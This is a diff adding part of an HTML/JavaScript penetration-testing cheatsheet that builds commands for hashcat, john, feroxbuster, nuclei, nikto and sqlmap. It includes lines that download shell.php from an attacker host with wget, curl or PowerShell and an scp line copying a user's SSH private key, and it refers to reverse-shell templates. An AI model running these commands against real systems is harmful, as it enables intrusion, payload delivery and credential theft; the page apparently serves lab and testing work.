+            <div class="cmd-header" onclick="toggleSection(this)">
+                <h2>File Server</h2>
+                <span class="toggle-icon">▼</span>
+            </div>
+            <section class="sec-body">
+                <pre class="cmd">python3 -m http.server <span class="lport">8080</span></pre>
+                <pre class="cmd">wget <span class="lhost">10.200.180.200</span>:<span class="lport">8080</span>/<span class="filename">shell.php</span> -O /tmp/<span class="filename">shell.php</span> && chmod +x /tmp/<span class="filename">shell.php</span></pre>
+                <pre class="cmd">curl <span class="lhost">10.200.180.200</span>:<span class="lport">8080</span>/<span class="filename">shell.php</span> -o /tmp/<span class="filename">shell.php</span> && chmod +x /tmp/<span class="filename">shell.php</span></pre>
+                <pre class="cmd">powershell -nop -c "iwr <span class="lhost">10.200.180.200</span>:<span class="lport">8080</span>/<span class="filename">shell.php</span> -o <span class="filename">shell.php</span>"</pre>
+                <pre class="cmd">scp JOHN@<span class="ip">REMOTE_IP</span>:/home/kay/.ssh/id_rsa .</pre>
+            </section>
+        </main>
+    </div>
+
+    <!-- PRIVATE NOTES PAGE (Iframe version) -->
+    <div id="notes-iframe" class="page iframe-page">
+        <iframe src="notes.html"></iframe>
+    </div>
+
+    <!-- IMAGE PAYLOAD GENERATOR PAGE (Iframe version) -->
+    <div id="payload-iframe" class="page iframe-page">
+        <iframe src="payload.html"></iframe>
+    </div>
+
+    <!-- PORT FORWARDING & PIVOTING PAGE (Iframe version) -->
+    <div id="pivot-iframe" class="page iframe-page">
+        <iframe src="pivot.html"></iframe>
+    </div>
+
+    <script>
+        // Hashcat and John type mappings
+        const hcPairs = [
+            ["0", "MD5"], ["10", "md5($pass.$salt)"], ["100", "SHA1"], ["1000", "NTLM"], 
+            ["1100", "Domain Cached"], ["1400", "SHA-256"], ["1500", "DES(Unix)"], 
+            ["1600", "md5apr1"], ["1700", "SHA-512"], ["1800", "SHA-512(Unix)"], 
+            ["2100", "DCC2"], ["22000", "WPA-PBKDF2"], ["2400", "Cisco-PIX"], 
+            ["2410", "Cisco-ASA"], ["2500", "WPA/WPA2"], ["2600", "md5(md5($pass))"], 
+            ["3000", "LM"], ["3200", "bcrypt"], ["3710", "md5($salt.$pass)"], 
+            ["4300", "md5(strtoupper(md5($pass)))"], ["4400", "md5(sha1($pass))"], 
+            ["4500", "sha1(sha1($pass))"], ["4700", "sha1(md5($pass))"], 
+            ["4800", "iSCSI"], ["4900", "sha1($salt.$pass.$salt)"], 
+            ["5000", "SHA-3(Keccak)"], ["5100", "Half-MD5"], ["5300", "IKE-PSK"], 
+            ["5400", "IKE-PSK SHA256"], ["5500", "NetNTLMv1"], ["5600", "NetNTLMv2"], 
+            ["6000", "RipeMD160"], ["6100", "Whirlpool"], ["6300", "AIX(smd5)"], 
+            ["6400", "AIX(ssha256)"], ["6500", "AIX(ssha512)"], ["6600", "1Password"], 
+            ["6700", "AIX(ssha1)"], ["6800", "LastPass"], ["6900", "GOST"], 
+            ["7000", "Fortigate"], ["7100", "macOS v10.8+"], ["7200", "GRUB 2"], 
+            ["7300", "IPMI2 RAKP"], ["7400", "sha256crypt"], ["7500", "Kerberos 5 AS-REQ"], 
+            ["7600", "Redmine"], ["7700", "SAP CODVN B"], ["7800", "SAP CODVN F"], 
+            ["7900", "Drupal7"], ["8000", "Sybase ASE"], ["8100", "Citrix NetScaler"], 
+            ["8200", "1Password PBES2"], ["8300", "DNSSEC NSEC3"], ["8400", "WBB3"], 
+            ["8500", "RACF"], ["8600", "Lotus Notes"], ["8700", "SAP CODVN G"], 
+            ["8800", "Android FDE"], ["8900", "scrypt"], ["9000", "PBKDF2-HMAC-SHA1"], 
+            ["9100", "Lotus Notes 8"], ["9200", "Cisco $8$"], ["9300", "Cisco $9$"], 
+            ["9400", "Office 2007"], ["9500", "Office 2010"], ["9600", "Office 2013"], 
+            ["9700", "MS-AzureSync"], ["9800", "Radmin2"], ["9900", "RipeMD128"], 
+            ["10000", "Django PBKDF2"], ["10900", "PBKDF2-HMAC-SHA256"], 
+            ["11300", "Bitcoin/Litecoin"], ["11600", "7-Zip"], 
+            ["11700", "GOST R 34.11-2012"], ["11800", "SHA-224"], 
+            ["12000", "PBKDF2-HMAC-SHA512"], ["12100", "PBKDF2-HMAC-SHA384"], 
+            ["12500", "AIX(ssha1)"], ["12600", "AIX(ssha256)"], 
+            ["12700", "AIX(ssha512)"], ["12800", "BCrypt $2a$05"], 
+            ["12900", "BCrypt $2a$06"], ["13000", "BCrypt $2a$08"], 
+            ["13100", "BCrypt $2a$10"], ["13200", "BCrypt $2a$12"], 
+            ["13300", "BCrypt $2b$05"], ["13400", "BCrypt $2b$06"], 
+            ["13500", "BCrypt $2b$08"], ["13600", "BCrypt $2b$10"], 
+            ["13700", "BCrypt $2b$12"], ["13800", "WinZip"], ["13900", "OpenCart"], 
+            ["14000", "DES(Oracle)"], ["14100", "3DES(Oracle)"], ["14200", "Oracle 11g"], 
+            ["14300", "Oracle 12c"], ["14400", "EPiServer"], ["14600", "LUKS"], 
+            ["14700", "iTunes backup"], ["14800", "CPUcoin"], ["14900", "SCRYPT-OC"], 
+            ["15000", "FileZilla Server"]
+        ];
+        
+        const jPairs = [
+            ["md5", "MD5"], ["NT", "NT"], ["sha512crypt", "SHA-512(Unix)"], 
+            ["bcrypt", "bcrypt"], ["descrypt", "DES(Unix)"], 
+            ["bsdicrypt", "BSDiCrypt"], ["md5crypt", "MD5(Unix)"], 
+            ["sha256crypt", "SHA-256(Unix)"], ["mysql", "MySQL"], 
+            ["mysql-sha1", "MySQL-SHA1"], ["oracle", "Oracle"], 
+            ["oracle11", "Oracle 11"], ["oracle12c", "Oracle 12c"], 
+            ["postgres", "PostgreSQL"], ["raw-md5", "Raw-MD5"], 
+            ["raw-sha1", "Raw-SHA1"], ["raw-sha256", "Raw-SHA256"], 
+            ["raw-sha512", "Raw-SHA512"]
+        ];
+        
+        // Initialize dropdowns
+        const hcSel = document.getElementById('hcType');
+        hcPairs.forEach(([n, d]) => {
+            const o = document.createElement('option');
+            o.value = n;
+            o.text = `${n} – ${d}`;
+            hcSel.appendChild(o);
+        });
+        
+        const jSel = document.getElementById('jType');
+        jPairs.forEach(([n, d]) => {
+            const o = document.createElement('option');
+            o.value = n;
+            o.text = `${n} – ${d}`;
+            jSel.appendChild(o);
+        });
+        
+        // Live command updating
+        const ip = document.getElementById('ip');
+        const port = document.getElementById('port');
+        const user = document.getElementById('user');
+        const word = document.getElementById('word');
+        const customWordlist = document.getElementById('customWordlist');
+        const customWordlistContainer = document.getElementById('customWordlistContainer');
+        const hash = document.getElementById('hash');
+        const hcT = document.getElementById('hcType');
+        const jT = document.getElementById('jType');
+        const lhost = document.getElementById('lhost');
+        const lport = document.getElementById('lport');
+        const filename = document.getElementById('filename');
+        
+        // Feroxbuster elements
+        const feroxExclude = document.getElementById('feroxExclude');
+        const feroxNoRecursion = document.getElementById('feroxNoRecursion');
+        const feroxAutoTune = document.getElementById('feroxAutoTune');
+        const feroxQuiet = document.getElementById('feroxQuiet');
+        const feroxExtensions = document.getElementById('feroxExtensions');
+        
+        // Nuclei elements
+        const nucleiUrl = document.getElementById('nucleiUrl');
+        const nucleiTemplate = document.getElementById('nucleiTemplate');
+        const nucleiCustomTemplate = document.getElementById('nucleiCustomTemplate');
+        const nucleiCustomTemplateContainer = document.getElementById('nucleiCustomTemplateContainer');
+        const nucleiSeverityLow = document.getElementById('nucleiSeverityLow');
+        const nucleiSeverityMedium = document.getElementById('nucleiSeverityMedium');
+        const nucleiSeverityHigh = document.getElementById('nucleiSeverityHigh');
+        const nucleiSeverityCritical = document.getElementById('nucleiSeverityCritical');
+        const nucleiSilent = document.getElementById('nucleiSilent');
+        const nucleiNoColor = document.getElementById('nucleiNoColor');
+        const nucleiUpdate = document.getElementById('nucleiUpdate');
+        const nucleiVerbose = document.getElementById('nucleiVerbose');
+        const nucleiConcurrency = document.getElementById('nucleiConcurrency');
+        const nucleiRateLimit = document.getElementById('nucleiRateLimit');
+        const nucleiTimeout = document.getElementById('nucleiTimeout');
+        const nucleiRetries = document.getElementById('nucleiRetries');
+        
+        // Nikto elements
+        const niktoUrl = document.getElementById('niktoUrl');
+        const niktoPort = document.getElementById('niktoPort');
+        const niktoSSL = document.getElementById('niktoSSL');
+        const niktoEvasion = document.getElementById('niktoEvasion');
+        const niktoMutate = document.getElementById('niktoMutate');
+        const niktoSingle = document.getElementById('niktoSingle');
+        const niktoDisplay = document.getElementById('niktoDisplay');
+        const niktoFormatTXT = document.getElementById('niktoFormatTXT');
+        const niktoFormatCSV = document.getElementById('niktoFormatCSV');
+        const niktoFormatXML = document.getElementById('niktoFormatXML');
+        const niktoOutput = document.getElementById('niktoOutput');
+        const niktoUserAgent = document.getElementById('niktoUserAgent');
+        const niktoTimeout = document.getElementById('niktoTimeout');
+        
+        // SQLMap elements
+        const sqlmapUrl = document.getElementById('sqlmapUrl');
+        const sqlmapDb = document.getElementById('sqlmapDb');
+        const sqlmapCurrentDb = document.getElementById('sqlmapCurrentDb');
+        const sqlmapCurrentUser = document.getElementById('sqlmapCurrentUser');
+        const sqlmapDbs = document.getElementById('sqlmapDbs');
+        const sqlmapTables = document.getElementById('sqlmapTables');
+        const sqlmapColumns = document.getElementById('sqlmapColumns');
+        const sqlmapDump = document.getElementById('sqlmapDump');
+        const sqlmapBatch = document.getElementById('sqlmapBatch');
+        const sqlmapRandomAgent = document.getElementById('sqlmapRandomAgent');
+        const sqlmapLevel = document.getElementById('sqlmapLevel');
+        const sqlmapRisk = document.getElementById('sqlmapRisk');
+        const sqlmapForms = document.getElementById('sqlmapForms');
+        const sqlmapCrawl = document.getElementById('sqlmapCrawl');
+        const sqlmapThreads = document.getElementById('sqlmapThreads');
+        const sqlmapDelay = document.getElementById('sqlmapDelay');
+        const sqlmapCookie = document.getElementById('sqlmapCookie');
+        const sqlmapUserAgent = document.getElementById('sqlmapUserAgent');
+        
+        // New function for toggling sections with header
+        function toggleSection(header) {
+            const section = header.nextElementSibling;
+            const isExpanded = section.style.display === 'block';
+            
+            section.style.display = isExpanded ? 'none' : 'block';
+            header.classList.toggle('expanded', !isExpanded);
+        }
+        
+        function update() {
+            // Get the correct wordlist path
+            let wordlistPath = word.value;
+            if (word.value === 'custom' && customWordlist.value) {
+                wordlistPath = customWordlist.value;
+            }
+            
+            // Update basic commands
+            document.querySelectorAll('#cmd pre.cmd:not(#curlBasic):not(#curlAdvanced):not(#sqlmapBasic):not(#sqlmapFull):not(#nucleiBasic):not(#nucleiFull):not(#niktoBasic):not(#niktoFull):not(#feroxCustom)').forEach(p => {
+                let h = p.innerHTML;
+                
+                h = h.replace(/<span class="ip">.*?<\/span>/g, `<span class="ip">${ip.value || '10.10.10.10'}</span>`);
+                h = h.replace(/<span class="port">.*?<\/span>/g, `<span class="port">${port.value || '443'}</span>`);
+                h = h.replace(/<span class="user">.*?<\/span>/g, `<span class="user">${user.value || 'kay'}</span>`);
+                h = h.replace(/<span class="word">.*?<\/span>/g, `<span class="word">${wordlistPath || '/usr/share/wordlists/rockyou.txt'}</span>`);
+                h = h.replace(/<span class="hash">.*?<\/span>/g, `<span class="hash">${hash.value || 'hash.txt'}</span>`);
+                h = h.replace(/<span class="hcType">.*?<\/span>/g, `<span class="hcType">${hcT.value}</span>`);
+                h = h.replace(/<span class="jType">.*?<\/span>/g, `<span class="jType">${jT.value}</span>`);
+                h = h.replace(/<span class="lhost">.*?<\/span>/g, `<span class="lhost">${lhost.value || '10.200.180.200'}</span>`);
+                h = h.replace(/<span class="lport">.*?<\/span>/g, `<span class="lport">${lport.value || '8080'}</span>`);
+                h = h.replace(/<span class="filename">.*?<\/span>/g, `<span class="filename">${filename.value || 'shell.php'}</span>`);
+                p.innerHTML = h;
+            });
+            
+            // Update Feroxbuster commands
+            updateFeroxCommands();
+            
+            // Update Nuclei commands
+            updateNucleiCommands();
+            
+            // Update Nikto commands
+            updateNiktoCommands();
+            
+            // Update SQLMap commands
+            updateSQLMapCommands();
+            
+            // Add copy buttons to all commands
+            addCopyButtons();
+        }
+        
+        function updateFeroxCommands() {
+            // Build Feroxbuster options
+            let feroxOptions = [];
+            
+            if (feroxNoRecursion.checked) feroxOptions.push('-n');
+            if (feroxAutoTune.checked) feroxOptions.push('-f');
+            if (feroxQuiet.checked) feroxOptions.push('-q');
+            
+            const feroxOptionsStr = feroxOptions.join(' ');
+            
+            // Update Feroxbuster custom command
+            const feroxCustom = document.getElementById('feroxCustom');
+            
+            feroxCustom.innerHTML = `feroxbuster -u http://<span class="feroxUrl">${ip.value || '10.10.10.10'}:${port.value || '80'}</span> -w <span class="feroxWordlist">${word.value || '/usr/share/wordlists/rockyou.txt'}</span> -x <span class="feroxExtensions">${feroxExtensions.value || 'php,txt,html'}</span> -C <span class="feroxExclude">${feroxExclude.value || '404,403'}</span> <span class="feroxOptions">${feroxOptionsStr}</span>`;
+        }
+        
+        function updateNucleiCommands() {
+            // Get Nuclei template
+            let nucleiTemplatePath = nucleiTemplate.value;
+            if (nucleiTemplate.value === 'file' && nucleiCustomTemplate.value) {
+                nucleiTemplatePath = nucleiCustomTemplate.value;
+            } else if (nucleiTemplate.value) {
+                nucleiTemplatePath = `${nucleiTemplate.value}/`;
+            }
+            
+            // Build Nuclei options
+            let nucleiOptions = [];
+            
+            if (nucleiSilent.checked) nucleiOptions.push('-silent');
+            if (nucleiNoColor.checked) nucleiOptions.push('-nc');
+            if (nucleiUpdate.checked) nucleiOptions.push('-update-templates');
+            if (nucleiVerbose.checked) nucleiOptions.push('-v');
+            
+            // Build severity options
+            let nucleiSeverity = [];
+            if (nucleiSeverityLow.checked) nucleiSeverity.push('low');
+            if (nucleiSeverityMedium.checked) nucleiSeverity.push('medium');
+            if (nucleiSeverityHigh.checked) nucleiSeverity.push('high');
+            if (nucleiSeverityCritical.checked) nucleiSeverity.push('critical');
+            
+            let nucleiSeverityCmd = '';
+            if (nucleiSeverity.length > 0) {
+                nucleiSeverityCmd = `-severity ${nucleiSeverity.join(',')}`;
+            }
+            
+            const nucleiOptionsStr = nucleiOptions.join(' ');
+            const nucleiTemplateCmd = nucleiTemplatePath ? `-t ${nucleiTemplatePath}` : '';
+            
+            // Update Nuclei commands
+            const nucleiBasic = document.getElementById('nucleiBasic');
+            const nucleiFull = document.getElementById('nucleiFull');
+            
+            nucleiBasic.innerHTML = `nuclei -u <span class="nucleiUrl">${nucleiUrl.value || 'http://target.com'}</span> -t <span class="nucleiTemplate">${nucleiTemplatePath || 'cves/'}</span>`;
+            
+            nucleiFull.innerHTML = `nuclei -u <span class="nucleiUrl">${nucleiUrl.value || 'http://target.com'}</span> <span class="nucleiTemplateCmd">${nucleiTemplateCmd}</span> <span class="nucleiSeverityCmd">${nucleiSeverityCmd}</span> <span class="nucleiOptions">${nucleiOptionsStr}</span> -c <span class="nucleiConcurrency">${nucleiConcurrency.value || '25'}</span> -rl <span class="nucleiRateLimit">${nucleiRateLimit.value || '150'}</span> -timeout <span class="nucleiTimeout">${nucleiTimeout.value || '10'}</span> -retries <span class="nucleiRetries">${nucleiRetries.value || '1'}</span>`;
+        }
+        
+        function updateNiktoCommands() {
+            // Build Nikto options
+            let niktoOptions = [];
+            
+            if (niktoSSL.checked) niktoOptions.push('-ssl');
+            if (niktoEvasion.checked) niktoOptions.push('-evasion 1');
+            if (niktoMutate.checked) niktoOptions.push('-mutate');
+            if (niktoSingle.checked) niktoOptions.push('-Single');
+            if (niktoDisplay.checked) niktoOptions.push('-Display 1');
+            
+            // Build format options
+            let niktoFormatCmd = '';
+            if (niktoFormatTXT.checked) niktoFormatCmd = '-Format txt';
+            else if (niktoFormatCSV.checked) niktoFormatCmd = '-Format csv';
+            else if (niktoFormatXML.checked) niktoFormatCmd = '-Format xml';
+            
+            // Build user agent
+            let niktoUserAgentCmd = '';
+            if (niktoUserAgent.value.trim()) {
+                niktoUserAgentCmd = `-useragent "${niktoUserAgent.value.trim()}"`;
+            }
+            
+            const niktoOptionsStr = niktoOptions.join(' ');
+            
+            // Update Nikto commands
+            const niktoBasic = document.getElementById('niktoBasic');
+            const niktoFull = document.getElementById('niktoFull');
+            
+            niktoBasic.innerHTML = `nikto -h <span class="niktoUrl">${niktoUrl.value || 'http://target.com'}</span>`;
+            
+            niktoFull.innerHTML = `nikto -h <span class="niktoUrl">${niktoUrl.value || 'http://target.com'}</span> -p <span class="niktoPort">${niktoPort.value || '80'}</span> <span class="niktoOptions">${niktoOptionsStr}</span> <span class="niktoFormatCmd">${niktoFormatCmd}</span> -o <span class="niktoOutput">${niktoOutput.value || 'nikto_scan'}</span>.txt -T <span class="niktoTimeout">${niktoTimeout.value || '10'}</span> <span class="niktoUserAgentCmd">${niktoUserAgentCmd}</span>`;
+        }
+        
+        function updateSQLMapCommands() {
+            // Build SQLMap options
+            let sqlmapOptions = [];
+            let sqlmapEnumOptions = [];
+            
+            // Database type
+            let sqlmapDbCmd = '';
+            if (sqlmapDb.value) {
+                sqlmapDbCmd = `--dbms=${sqlmapDb.value}`;
+            }
+            
+            // Enumeration options
+            if (sqlmapCurrentDb.checked) sqlmapEnumOptions.push('--current-db');
+            if (sqlmapCurrentUser.checked) sqlmapEnumOptions.push('--current-user');
+            if (sqlmapDbs.checked) sqlmapEnumOptions.push('--dbs');
+            if (sqlmapTables.checked) sqlmapEnumOptions.push('--tables');
+            if (sqlmapColumns.checked) sqlmapEnumOptions.push('--columns');
+            if (sqlmapDump.checked) sqlmapEnumOptions.push('--dump');
+            
+            // General options
+            if (sqlmapBatch.checked) sqlmapOptions.push('--batch');
+            if (sqlmapRandomAgent.checked) sqlmapOptions.push('--random-agent');
+            if (sqlmapLevel.checked) sqlmapOptions.push('--level=1');
+            if (sqlmapRisk.checked) sqlmapOptions.push('--risk=1');
+            if (sqlmapForms.checked) sqlmapOptions.push('--forms');
+            if (sqlmapCrawl.checked) sqlmapOptions.push('--crawl=2');
+            
+            // Performance options
+            let sqlmapThreadsCmd = '';
+            if (sqlmapThreads.value && sqlmapThreads.value > 1) {
+                sqlmapThreadsCmd = `--threads=${sqlmapThreads.value}`;
+            }
+            
+            let sqlmapDelayCmd = '';
+            if (sqlmapDelay.value && sqlmapDelay.value > 0) {
+                sqlmapDelayCmd = `--delay=${sqlmapDelay.value}`;
+            }
+            
+            // Request options
+            let sqlmapCookieCmd = '';
+            if (sqlmapCookie.value.trim()) {
+                sqlmapCookieCmd = `--cookie="${sqlmapCookie.value.trim()}"`;
+            }
+            
+            let sqlmapUserAgentCmd = '';
+            if (sqlmapUserAgent.value.trim()) {
+                sqlmapUserAgentCmd = `--user-agent="${sqlmapUserAgent.value.trim()}"`;
+            }
+            
+            const sqlmapOptionsStr = [...sqlmapOptions, sqlmapDelayCmd].filter(Boolean).join(' ');
+            const sqlmapEnumOptionsStr = sqlmapEnumOptions.join(' ');
+            
+            // Update SQLMap commands
+            const sqlmapBasic = document.getElementById('sqlmapBasic');
+            const sqlmapFull = document.getElementById('sqlmapFull');
+            
+            sqlmapBasic.innerHTML = `sqlmap -u "<span class="sqlmapUrl">${sqlmapUrl.value || 'http://target.com/page.php?id=1'}</span>" --batch`;
+            
+            sqlmapFull.innerHTML = `sqlmap -u "<span class="sqlmapUrl">${sqlmapUrl.value || 'http://target.com/page.php?id=1'}</span>" <span class="sqlmapDbCmd">${sqlmapDbCmd}</span> <span class="sqlmapOptions">${sqlmapOptionsStr}</span> <span class="sqlmapEnumOptions">${sqlmapEnumOptionsStr}</span> <span class="sqlmapThreadsCmd">${sqlmapThreadsCmd}</span> <span class="sqlmapCookieCmd">${sqlmapCookieCmd}</span> <span class="sqlmapUserAgentCmd">${sqlmapUserAgentCmd}</span>`;
+        }
+        
+        function addCopyButtons() {
+            document.querySelectorAll('pre.cmd').forEach(pre => {
+                // Remove existing copy button if any
+                const existingBtn = pre.querySelector('.copy');
+                if (existingBtn) {
+                    existingBtn.remove();
+                }
+                
+                const b = document.createElement('button');
+                b.textContent = 'copy';
+                b.className = 'copy';
+                b.addEventListener('click', () => {
+                    // Get the text content without the shell type description
+                    const text = pre.textContent.replace('copy', '').replace(/Bash TCP Reverse Shell|Netcat Reverse Shell|Python3 Reverse Shell|Python Reverse Shell|PHP Reverse Shell|Perl Reverse Shell|Ruby Reverse Shell|PowerShell Reverse Shell|Socat Reverse Shell/g, '').trim();
+                    navigator.clipboard.writeText(text).catch(() => {
+                        const ta = document.createElement('textarea');
+                        ta.value = text;
+                        ta.style.position = 'fixed';
+                        ta.style.opacity = 0;
+                        document.body.appendChild(ta);
+                        ta.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(ta);
+                    });
+                });
+                pre.appendChild(b);
+            });
+        }
+        
+        // Custom wordlist toggle
+        word.addEventListener('change', function() {
+            customWordlistContainer.style.display = this.value === 'custom' ? 'block' : 'none';
+            update();
+        });
+        
+        nucleiTemplate.addEventListener('change', function() {
+            nucleiCustomTemplateContainer.style.display = this.value === 'file' ? 'block' : 'none';
+            update();
+        });
+        
+        // Add event listeners for all inputs
+        const allInputs = [
+            'ip', 'port', 'user', 'word', 'customWordlist', 'hash', 'hcType', 'jType', 'lhost', 'lport', 'filename',
+            'nucleiUrl', 'nucleiTemplate', 'nucleiCustomTemplate', 'nucleiConcurrency', 'nucleiRateLimit', 'nucleiTimeout', 'nucleiRetries',
+            'niktoUrl', 'niktoPort', 'niktoOutput', 'niktoUserAgent', 'niktoTimeout',
+            'sqlmapUrl', 'sqlmapDb', 'sqlmapThreads', 'sqlmapDelay', 'sqlmapCookie', 'sqlmapUserAgent',
+            'feroxExclude', 'feroxExtensions'
+        ];
+        
+        allInputs.forEach(id => {
+            document.getElementById(id).addEventListener('input', update);
+        });
+        
+        // Add event listeners for checkboxes
+        const allCheckboxes = [
+            'nucleiSeverityLow', 'nucleiSeverityMedium', 'nucleiSeverityHigh', 'nucleiSeverityCritical', 
+            'nucleiSilent', 'nucleiNoColor', 'nucleiUpdate', 'nucleiVerbose',
+            'niktoSSL', 'niktoEvasion', 'niktoMutate', 'niktoSingle', 'niktoDisplay', 'niktoFormatTXT', 'niktoFormatCSV', 'niktoFormatXML',
+            'sqlmapCurrentDb', 'sqlmapCurrentUser', 'sqlmapDbs', 'sqlmapTables', 'sqlmapColumns', 'sqlmapDump',
+            'sqlmapBatch', 'sqlmapRandomAgent', 'sqlmapLevel', 'sqlmapRisk', 'sqlmapForms', 'sqlmapCrawl',
+            'feroxNoRecursion', 'feroxAutoTune', 'feroxQuiet'
+        ];
+        
+        allCheckboxes.forEach(id => {
+            document.getElementById(id).addEventListener('change', update);
+        });
+        
+        // Collapse/expand sections
+        function toggleAll() {
+            const bodies = document.querySelectorAll('#cmd .sec-body');
+            const allHidden = [...bodies].every(b => b.style.display === 'none');
+            bodies.forEach(b => b.style.display = allHidden ? 'block' : 'none');
+            
+            // Update button text
+            const button = document.querySelector('button[onclick="toggleAll()"]');
+            button.textContent = allHidden ? 'Collapse All Sections' : 'Expand All Sections';
+            
+            // Update header states
+            const headers = document.querySelectorAll('.cmd-header');
+            headers.forEach(header => {
+                header.classList.toggle('expanded', allHidden);
+            });
+        }
+        
+        // Tab switching
+        document.querySelectorAll('nav a').forEach(a => {
+            a.addEventListener('click', e => {
+                e.preventDefault();
+                document.querySelectorAll('nav a').forEach(n => n.classList.remove('active'));
+                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+                a.classList.add('active');
+                document.getElementById(a.dataset.page).classList.add('active');
+            });
+        });
+        
+        // Initialize
+        update();
+        
+        // Set all sections to collapsed by default
+        document.querySelectorAll('#cmd .sec-body').forEach(b => {
+            b.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
